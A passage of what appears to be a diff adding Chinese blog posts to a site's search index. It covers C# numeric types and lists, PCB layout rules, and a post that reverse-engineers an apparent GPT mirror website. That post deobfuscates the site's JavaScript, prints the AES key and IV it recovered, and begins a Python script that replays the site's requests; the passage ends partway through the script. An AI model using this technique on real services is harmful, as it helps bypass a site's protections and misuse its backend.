+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/kurA6Jf0.png"
+                      style="zoom:50%;" 
+                >
+
+<p>同样，双精度类型也有取值范围，但范围较整数类型大得多 ：</p>
+<ul>
+<li><strong><code>-1.79769313486232E+308</code> 至 <code>1.79769313486232E+308</code></strong></li>
+<li>这个范围用科学计数法表示：左边的数字<code>E</code>是有效数。右边的数字是指数</li>
+</ul>
+<p><strong>C# 中的双精度数也可能存在舍入错误</strong></p>
+<p>例如：<strong>计算1&#x2F;3的结果</strong></p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">double</span> third = <span class="number">1.0</span> / <span class="number">3.0</span>;</span><br><span class="line">Console.WriteLine(third);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行上面的代码会输出<code>0.333333333333333</code>，<strong>这个结果并不等于1&#x2F;3</strong></p>
+<h2 id="decimal类型"><a href="#decimal类型" class="headerlink" title="decimal类型"></a><code>decimal</code>类型</h2><p>与<code>double</code> 相比，<code>decimal</code>类型的范围更小，但精度更高。</p>
+<ul>
+<li>范围：  <code>-79228162514264337593543950335 </code> 到  <code>79228162514264337593543950335</code></li>
+</ul>
+<p>运行下面的代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">double</span> a = <span class="number">1.0</span>;</span><br><span class="line"><span class="built_in">double</span> b = <span class="number">3.0</span>;</span><br><span class="line">Console.WriteLine(a / b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">decimal</span> c = <span class="number">1.0</span>M;</span><br><span class="line"><span class="built_in">decimal</span> d = <span class="number">3.0</span>M;</span><br><span class="line">Console.WriteLine(c / d);</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/XR2NZIa5.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>注意，使用小数类型的数学在小数点右侧有更多的数字。</li>
+<li>数字上的后缀<code>M</code>指示常量应使用该<code>decimal</code>类型。否则，编译器将采用该<code>double</code>类型。</li>
+</ul>
+<h1 id="到此已经学会了："><a href="#到此已经学会了：" class="headerlink" title="到此已经学会了："></a><span style="color:Gold">到此已经学会了：</span></h1><p><span style="color:green">         使用 <code>Console.WriteLine()</code> 将文本显示在屏幕上。</span></p>
+<p><span style="color:green">         如何声明变量和将字符串们串联在一起。</span></p>
+<p><span style="color:green">         字符串的修改方法。</span></p>
+<p><span style="color:blue">         C#的运算逻辑。</span></p>
+<p><span style="color:blue">         数据类型的区别和精度。</span></p>
+]]></content>
+      <tags>
+        <tag>C shorp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C shorp 基础(四)</title>
+    <url>/2023/07/07/C-shorp-%E5%9F%BA%E7%A1%80-%E5%9B%9B/</url>
+    <content><![CDATA[<h1 id="C-中的列表"><a href="#C-中的列表" class="headerlink" title="         C#中的列表"></a><span style="color:pink">         C#中的列表</span></h1><p>在编辑器中输入以下代码（可以<code>&lt;your name&gt;</code>将替换为你自己的名字）并选择<strong>“运行”</strong>：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> names = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt; &#123; <span class="string">&quot;&lt;your name&gt;&quot;</span>, <span class="string">&quot;Maria&quot;</span>, <span class="string">&quot;Xuxu&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> name <span class="keyword">in</span> names)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;Hello <span class="subst">&#123;name.ToUpper()&#125;</span>!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>结果如下：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/9dDfzEdR.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>显示名称的代码利用了<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/tokens/interpolated" >字符串插值 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>功能:在 <code>string</code>前面添加<code>$</code>字符时，可以在字符串声明中嵌入 C# 代码。</li>
+<li>输出大写是因为调用了<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.string.toupper" >String.ToUpper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>方法:<code>&#123;name.ToUpper()&#125;</code>用每个名称替换 并转换为大写字母。</li>
+</ul>
+<h2 id="修改列表内容"><a href="#修改列表内容" class="headerlink" title="修改列表内容"></a>修改列表内容</h2><p>创建的集合使用<a href="https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1">List<T></a>类型。该类型存储元素序列，可以指定尖括号之间的元素类型。<br>此类型的一个重要方面是它可以增大或缩小，能够添加或删除元素。显示内容后，可以通过修改内容来查看结果</p>
+<ul>
+<li><p>在之前已经编写的代码下方添加以下代码（在打印内容的循环下方）：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">Console.WriteLine();</span><br><span class="line">names.Add(<span class="string">&quot;Chieh&quot;</span>);</span><br><span class="line">names.Add(<span class="string">&quot;Bill&quot;</span>);</span><br><span class="line">names.Remove(<span class="string">&quot;Maria&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> name <span class="keyword">in</span> names)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;Hello <span class="subst">&#123;name.ToUpper()&#125;</span>!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
+</ul>
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/A086FTye.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>该代码的输出显示初始内容，然后会打印一个空行和新内容。</li>
+<li>现在列表末尾添加了另外两个名字。还删除了一个名字<code>Maria</code>。</li>
+</ul>
+<p> <a href="https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1">List<T></a>还允许您通过<strong>索引</strong>引用各个项目。<code>[</code>您可以使用和令牌访问项目<code>]</code>。在已经编写的代码里添加以下代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">$&quot;我的名字是<span class="subst">&#123;names[<span class="number">0</span>]&#125;</span>.&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;我认识 <span class="subst">&#123;names[<span class="number">1</span>]&#125;</span> 和 <span class="subst">&#123;names[<span class="number">2</span>]&#125;</span> &quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/GsIgfw2j.png"
+                      style="zoom:50%;" 
+                >
+
+<p>你无法访问超过列表长度之后的内容。您可以使用Count属性来检查列表的长度。添加以下代码来尝试一下：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">Console.WriteLine(<span class="string">$&quot;表单上有 <span class="subst">&#123;names.Count&#125;</span> 个人&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/h9gWoLD8.png"
+                      style="zoom:50%;" 
+                >
+
+<ul>
+<li>索引从 0 开始，因此最大的有效索引比列表中的项目数减 1</li>
+</ul>
+<h2 id="搜索和排序列表"><a href="#搜索和排序列表" class="headerlink" title="搜索和排序列表"></a>搜索和排序列表</h2><p>示例使用的是相对较小的列表，但实际中应用程序可能经常创建包含更多元素的列表，有时数量在数千之间。要在这些较大的集合中查找元素，需要在列表中搜索不同的项目。可以使用<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.indexof" >IndexOf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>方法搜索一个项目并返回该项目的索引。如果项目不在列表中，<code>IndexOf</code>返回<code>-1</code>，否则会返回项目在列表中的标号。<br>在你迄今为止写的代码下面添加以下代码：</p>
+<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> index = names.IndexOf(<span class="string">&quot;Chieh&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;名字为 <span class="subst">&#123;names[index]&#125;</span> 的序号为 <span class="subst">&#123;index&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> notFound = names.IndexOf(<span class="string">&quot;Not Found&quot;</span>);</span><br><span class="line">Console.WriteLine(<span class="string">$&quot;如果没有找到某个项目那么会返回 <span class="subst">&#123;notFound&#125;</span>&quot;</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/fnv822Eu.png"
+                      style="zoom:50%;" 
+                >
+
+<p>列表中的项目也可以排序。使用<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.sort" >Soet <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>方法按正常顺序（对于字符串按字母顺序）对列表中的所有项目进行排序添加此代码并再次运行：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line">names.Sort();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">var</span> name <span class="keyword">in</span> names)</span><br><span class="line">&#123;</span><br><span class="line">  Console.WriteLine(<span class="string">$&quot;Hello <span class="subst">&#123;name.ToUpper()&#125;</span>!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>输出结果：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/nYfVfYNd.png"
+                      style="zoom:50%;" 
+                >
+
+<p>到目前为止，你在列表中使用的是<code>string</code>类型。让我们使用不同的类型创建一个<a class="link"   href="https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1" >List <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。我们构建一个数字集。删除你到目前为止写的代码，然后输入下面的代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fibonacciNumbers = <span class="keyword">new</span> List&lt;<span class="built_in">int</span>&gt; &#123;<span class="number">1</span>, <span class="number">1</span>&#125;;</span><br></pre></td></tr></table></figure></div>
+
+<p>这将创建一个整数列表，并将前两个整数设置为值 1，接下来添加此代码：</p>
+<div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (fibonacciNumbers.Count &lt; <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> previous = fibonacciNumbers[fibonacciNumbers.Count - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">var</span> previous2 = fibonacciNumbers[fibonacciNumbers.Count - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    fibonacciNumbers.Add(previous + previous2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">var</span> item <span class="keyword">in</span> fibonacciNumbers)</span><br><span class="line">&#123;</span><br><span class="line">    Console.WriteLine(item);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这给程序是一个斐波那契数列，循环的每次迭代中，都会获取列表中的最后两个整数，然后对它们求和，然后将该值添加到列表中。重复5次循环</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img1.imgtp.com/2023/07/07/IFYUVWSJ.png"
+                      style="zoom:50%;" 
+                >
+
+<h1 id="到此已经学会了："><a href="#到此已经学会了：" class="headerlink" title="到此已经学会了："></a><span style="color:Gold">到此已经学会了：</span></h1><p><span style="color:green">         使用 <code>Console.WriteLine()</code> 将文本显示在屏幕上。</span></p>
+<p><span style="color:green">         如何声明变量和将字符串们串联在一起。</span></p>
+<p><span style="color:green">         字符串的修改方法。</span></p>
+<p><span style="color:blue">         C#的运算逻辑。</span></p>
+<p><span style="color:blue">         数据类型的区别和精度。</span></p>
+<p><span style="color:orange">         分支和循环语句。</span></p>
+<p><span style="color:orange">         循环体。</span></p>
+<p><span style="color:pink">         修改列表。</span></p>
+<p><span style="color:pink">         搜索和排序列表。</span></p>
+]]></content>
+      <tags>
+        <tag>C shorp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PCB规则</title>
+    <url>/2023/07/24/PCB%E8%A7%84%E5%88%99/</url>
+    <content><![CDATA[<h1 id="PCB布局的技巧"><a href="#PCB布局的技巧" class="headerlink" title="PCB布局的技巧"></a><strong>PCB布局的技巧</strong></h1><p><strong>1、弄清电路板物理限制</strong></p>
+<p>摆放元器件之前，先确定电路板的安装孔、边缘接插件的位置以及电路板的机械尺寸限制。</p>
+<p><strong>2、弄清电路板制作工艺</strong></p>
+<p>电路的组装工艺和测试流程、是否需要对PCB V型切槽预留空间、元器件焊接工艺等。</p>
+<p><strong>3、给集成芯片留下喘气空间</strong></p>
+<p>摆放元器件时，尽可能在它们之间留下至少350mil的距离，对于引脚多的芯片，留的空间需要更大。</p>
+<p><strong>4、相同器件方向一致</strong></p>
+<p>对于相同的器件，尽可能保持一致队形。便于后期电路板的组装、检查和测试，且保证焊点一致高。</p>
+<p><strong>5、减少引线交叉</strong></p>
+<p>通过调整器件位置和方向，减少引线交叉。可以为后面布线节省大量的精力。</p>
+<p><strong>6、先摆放电路边缘器件</strong></p>
+<p>对于因受机械限制而无法任意移动的器件，要先进行摆放，比如电路板上的外部接插件、开关、USB端口等。</p>
+<p><strong>7、避免器件之间冲突</strong></p>
+<p>绝对避免为了在小的电路板中布线而将器件的焊盘重叠共用，或使得器件边缘重叠，最好在所有器件之间保持40mil的距离。</p>
+<p><strong>8、将器件尽量放在同一面</strong></p>
+<p>电路板上的器件是通过自动器件摆放机器完成，器件只在一面，生产PCB过程只需要一遍即可，否则就需要两次器件摆放，浪费生产时间也浪费成本。</p>
+<p><strong>9、保持芯片管脚和器件极性一致</strong></p>
+<p>电路板上元器件的极性和方向凌乱的话，对于成功焊接电路板有阻碍。</p>
+<p><strong>10、器件位置与原理图上相似</strong></p>
+<p>设计原理图时，就已经优化了器件之间的位置关系(连线最短、交叉最少)，所以按照原理图上器件位置来摆放PCB器件会更合理。</p>
+<p><strong>PCB布线的规则</strong></p>
+<p><strong>1、走线的方向控制规则</strong></p>
+<p>即相邻层的走线方向成正交结构。避免将不同的信号线在相邻层走成同一方向，以减少不必要的层间窜扰；当由于板结构限制(如某些背板)难以避免出现该情况，特别是信号速率较高时，应考虑用地平面隔离各布线层，用地信号线隔离各信号线。</p>
+<p><strong>2、走线的开环检查规则</strong></p>
+<p>一般不允许出现一端浮空的布线(Dangling Line)， 主要是为了避免产生”天线效应”，减少不必要的干扰辐射和接受，否则可能带来不可预知的结果。</p>
+<p><strong>3、阻抗匹配检查规则</strong></p>
+<p>同一网络的布线宽度应保持一致，线宽的变化会造成线路特性阻抗的不均匀，当传输的速度较高时会产生反射，在设计中应该尽量避免这种情况。</p>
+<p><strong>4、走线长度控制规则</strong></p>
+<p>即短线规则，在设计时应该尽量让布线长度尽量短，以减少由于走线过长带来的干扰问题，特别是一些重要信号线，如时钟线，务必将其振荡器放在离器件很近的地方。</p>
+<p><strong>5、倒角规则</strong></p>
+<p>PCB设计中应避免产生锐角和直角， 产生不必要的辐射，同时工艺性能也不好。</p>
+<p><strong>6、器件去耦规则</strong></p>
+<p>在印制版上增加必要的去耦电容，滤除电源上的干扰信号，使电源信号稳定。</p>
+<p><strong>7、地线回路规则</strong></p>
+<p>环路最小规则，即信号线与其回路构成的环面积要尽可能小，环面积越小，对外的辐射越少，接收外界的干扰也越小。</p>
+<p><strong>8、电源与地线层的完整性规则</strong></p>
+<p>对于导通孔密集的区域，要注意避免孔在电源和地层的挖空区域相互连接，形成对平面层的分割，从而破坏平面层的完整性，并进而导致信号线在地层的回路面积增大。</p>
+<p><strong>9、屏蔽保护</strong></p>
+<p>对应地线回路规则，实际上也是为了尽量减小信号的回路面积，多见于一些比较重要的信号，如时钟信号，同步信号。</p>
+<p><strong>10、走线闭环检查规则</strong></p>
+<p>防止信号线在不同层间形成自环。在多层板设计中容易发生此类问题， 自环将引起辐射干扰。</p>
+<p><strong>11、孤立铜区控制规则</strong></p>
+<p>孤立铜区的出现， 将带来一些不可预知的问题， 因此将孤立铜区与别的信号相接， 有助于改善信号质量，通常是将孤立铜区接地或删除。</p>
+]]></content>
+      <tags>
+        <tag>硬件</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GPT网站问答流程逆向和Python复现</title>
+    <url>/2023/05/12/GPT%E7%BD%91%E7%AB%99%E9%97%AE%E7%AD%94%E6%B5%81%E7%A8%8B%E9%80%86%E5%90%91%E5%92%8CPython%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><p>F12打开开发者工具，输入问题，点击发送，查看Network记录</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NsS41.png"
+                     
+                ></p>
+<p>发现有两条请求，第一条是普通的XMLHttpRequest，第二条是一个stream流，联想到网站显示回答时通常一个字一个字逐步显示，回答应该就是通过stream流传输的</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NsC36.png"
+                     
+                ></p>
+<p>查看该流，果然将答案拆开传输，这就是我们的目标请求了，观察stream流请求：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NyUdH.png"
+                     
+                ></p>
+<p>这样的不带参数的get请求如何使服务端确定问题是什么呢，猜测网站对cookie进行了操作，查看两条请求的cookie：</p>
+<p>1.submit的cookie</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NsPgK.png"
+                     
+                ></p>
+<p>2.stream的cookie</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NrjHJ.png"
+                     
+                ></p>
+<p>发现在submit后，响应体设置了新的cookie：<code>session</code>，因此只要获取该session的cookie值，就可以编写请求索取GPT的回答。为了获取session值，则需要先发送submit请求，观察该请求，发现这是一个POST请求，通过Payload的方式上传数据</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9Ns99x.png"
+                     
+                ></p>
+<p>这里有两个参数：<code>his</code>和<code>prompt</code>，prompt很好理解，就是发送的问题，此处进行了加密处理，his是一个列表，大概率是历史记录（该GPT有根据上文回答问题的功能），那么我们先分析prompt的生成</p>
+<p>观察到submit请求的Initiator是main.js，直接到该文件中搜索”prompt”，发现并没有结果</p>
+<p>观察main.js，发现是加密混淆过的，其中有大量的十六进制字符串和一堆毫无意义的偏移和函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://s1.ax1x.com/2023/05/05/p9NrxE9.png"
+                     
+                ></p>
+<p>把文件送入解密网站，把代码进行解码，再次搜索”prompt”</p>
+<p>成功定位到了位置：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var W = input_value;  // 输入的问题字符串</span><br><span class="line">document[n(zZ.Xb, 0x145, zZ.js, zZ.XR) + &#x27;Ele&#x27; + n(0x1de, 0x30e, &#x27;z$N#&#x27;, 0x1e2) + &#x27;tBy&#x27; + &#x27;Id&#x27;](I[d(zZ.Xm, zZ.XV, 0x25, -zZ.XM) + &#x27;kc&#x27;])[d(zZ.XO, zZ.XH, 0x45, 0x154) + &#x27;ue&#x27;] = &#x27;&#x27;;</span><br><span class="line">var y = I[d(zZ.Xt, zZ.XQ, -0x147, zZ.Xe) + &#x27;SF&#x27;](P, W);</span><br><span class="line">D[n(0x1b5, zZ.um, &#x27;YS3C&#x27;, 0x114) + &#x27;d&#x27;](JSON[d(&#x27;5l3F&#x27;, -0xef, -zZ.XT, -0x20f) + n(zZ.Xl, 0x174, &#x27;jHS6&#x27;, -zZ.Xs) + n(0xea, zZ.XZ, zZ.Xa, -zZ.XG)](&#123;</span><br><span class="line">    &#x27;prompt&#x27;: y,</span><br><span class="line">    &#x27;his&#x27;: window[n(zZ.XJ, -0x2, &#x27;2Qf[&#x27;, 0x74) + d(&#x27;[qgO&#x27;, -zZ.XF, -zZ.Xr, -zZ.jz) + &#x27;ys&#x27;][n(zZ.Xc, 0x154, &#x27;i2$#&#x27;, 0x1bc) + d(zZ.Xv, -zZ.XE, -zZ.Xh, -0x2ad)] &lt;= 0x1d * 0x76 + 0x18f2 + -0xcc5 * 0x3 || !document[n(0x1e, -zZ.Xn, &#x27;xt$S&#x27;, zZ.Xd) + &#x27;Ele&#x27; + n(0x8, -0x3e, &#x27;5l3F&#x27;, zZ.XK) + n(zZ.XL, -0x57, &#x27;8UZA&#x27;, zZ.S0) + &#x27;Id&#x27;](I[d(zZ.S1, -0x1cb, -0x311, -0x7f) + &#x27;pZ&#x27;])[n(0x1fe, zZ.S2, &#x27;2Qf[&#x27;, zZ.S3) + &#x27;cke&#x27; + &#x27;d&#x27;] ? [] : window[d(zZ.S4, -0x22a, -zZ.S5, -zZ.S6) + n(zZ.ja, -zZ.S7, zZ.u0, 0x18c) + &#x27;ys&#x27;]</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure></div>
+
+<p>整个代码都被混淆了，但依稀还能见到一些影子，比如第二行中能拼凑出熟悉的<code>ElementById</code></p>
+<p>这里能发现，prompt值就是y，而his的值则是先比较了<code>historyCheck</code>的值，如果选择了则为列表值，未选择则为空列表<code>[]</code></p>
+<p>重点在y的计算上，此处打上断点，重新发送，定位到该函数的位置：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\x5a\x41\x7a\x53\x46&#x27;: function(x, U) &#123;</span><br><span class="line">    return x(U);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></div>
+
+<p>即:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var y = P(W);</span><br></pre></td></tr></table></figure></div>
+
+<p>跳转到函数P：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function P(x) &#123;</span><br><span class="line">    var zf = &#123;</span><br><span class="line">        I: 0x23,</span><br><span class="line">        P: 0x159</span><br><span class="line">    &#125;;</span><br><span class="line">    const U = CryptoJS[K(zw.I, zw.P, zw.D, 0x634)][K(zw.W, zw.y, zw.x, 0x5f7) + &#x27;8&#x27;][L(-0x172, -0x1a6, zw.U, -0x1cd) + &#x27;se&#x27;](I[K(0x4f8, zw.p, zw.f, 0x348) + &#x27;DP&#x27;]);</span><br><span class="line"></span><br><span class="line">    function K(I, P, D, W) &#123;</span><br><span class="line">        return d(P, I - zp.I, D - zp.P, W - zp.D);</span><br><span class="line">    &#125;</span><br><span class="line">    const p = CryptoJS[L(zw.w, -zw.C, &#x27;Oh0s&#x27;, -0x88)][K(0x57a, &#x27;8Xtv&#x27;, 0x689, 0x522) + &#x27;8&#x27;][L(-0x3a, -0xf1, &#x27;TyCN&#x27;, zw.k) + &#x27;se&#x27;](I[L(-0xec, 0x78, zw.N, -zw.B) + &#x27;gQ&#x27;]);</span><br><span class="line">    let f = CryptoJS[L(-0x29a, -zw.q, &#x27;!mzD&#x27;, -zw.Y)][K(zw.A, zw.zC, zw.zk, zw.zN) + &#x27;ryp&#x27; + &#x27;t&#x27;](x, U, &#123;</span><br><span class="line">        &#x27;iv&#x27;: p,</span><br><span class="line">        &#x27;mode&#x27;: CryptoJS[K(zw.zB, zw.zq, zw.zY, 0x208) + &#x27;e&#x27;][K(zw.zA, &#x27;ui19&#x27;, zw.zb, zw.zR)],</span><br><span class="line">        &#x27;padding&#x27;: CryptoJS[K(zw.zm, zw.zV, 0x600, 0x58c)][L(-zw.zM, -zw.zO, zw.zH, -0x11) + K(0x4b5, zw.zt, 0x65a, zw.zQ) + L(zw.ze, -zw.zT, zw.zl, -zw.zs) + &#x27;ng&#x27;]</span><br><span class="line">    &#125;)[&#x27;toS&#x27; + L(zw.zZ, 0x52, &#x27;AO11&#x27;, -zw.za) + &#x27;ng&#x27;]();</span><br><span class="line">    console[K(zw.zG, zw.zJ, 0x3ed, 0x48f)](f);</span><br><span class="line"></span><br><span class="line">    function L(I, P, D, W) &#123;</span><br><span class="line">        return d(D, W - -zf.I, D - 0x2b, W - zf.P);</span><br><span class="line">    &#125;</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>看到CryptoJS关键字就知道，原来是老朋友AES加密，加密代码一般长这样：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">let f = CryptoJS.AES.encrypt(data, key, &#123;</span><br><span class="line">    &#x27;iv&#x27;: iv,</span><br><span class="line">    &#x27;mode&#x27;: CryptoJS.mode.CBC,</span><br><span class="line">    &#x27;padding&#x27;: CryptoJS.pad.ZeroPadding</span><br><span class="line">&#125;).toString();</span><br></pre></td></tr></table></figure></div>
+
+<p>因此，只需要知道明文<code>data</code>，偏移量<code>iv</code>，密钥<code>key</code>，加密模式<code>mode</code>和<code>padding</code>模式就能算出密文</p>
+<p>将混淆的代码函数片段拖入console中运行，逐步得到关键信息，将代码简化后可以得到：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function P(x) &#123;</span><br><span class="line">    const U = CryptoJS.enc.Utf8.parse(&#x27;y~.,ZaabH6Ri?L7*&#x27;);</span><br><span class="line">    const p = CryptoJS.enc.Utf8.parse(&#x27;koJ)KZhR1RW)!_~M&#x27;);</span><br><span class="line">    let f = CryptoJS.AES.encrypt(x, U, &#123;</span><br><span class="line">        &#x27;iv&#x27;: p,</span><br><span class="line">        &#x27;mode&#x27;: CryptoJS.mode.CBC,</span><br><span class="line">        &#x27;padding&#x27;: CryptoJS.pad.ZeroPadding</span><br><span class="line">    &#125;).toString();</span><br><span class="line">    return f;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这样就一目了然了，以此即可复现整个问答流程</p>
+<h2 id="脚本复现"><a href="#脚本复现" class="headerlink" title="脚本复现"></a>脚本复现</h2><p>有了加密方式，便尝试使用python复现该过程，</p>
+<p>所需库：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">requests</span><br><span class="line">BeautifulSoup4</span><br><span class="line">pycryptodome</span><br></pre></td></tr></table></figure></div>
+
+<p>完整代码：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=gbk</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup <span class="keyword">as</span> bs</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prompt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&quot;y~.,ZaabH6Ri?L7*&quot;</span>.zfill(<span class="number">16</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    iv = <span class="string">&quot;koJ)KZhR1RW)!_~M&quot;</span>.zfill(<span class="number">16</span>).encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    temp = <span class="string">b&quot;&quot;</span></span><br><span class="line">    data = text.encode()</span><br><span class="line">    data = data + <span class="string">&quot;\0&quot;</span>.encode() * (<span class="number">16</span> - <span class="built_in">len</span>(data) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(data) / <span class="number">16</span>)):</span><br><span class="line">        block = data[<span class="number">16</span> * i: <span class="number">16</span> * (i + <span class="number">1</span>)]</span><br><span class="line">        b = cipher.encrypt(block)</span><br><span class="line">        temp += b</span><br><span class="line">    res = base64.b64encode(temp).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span 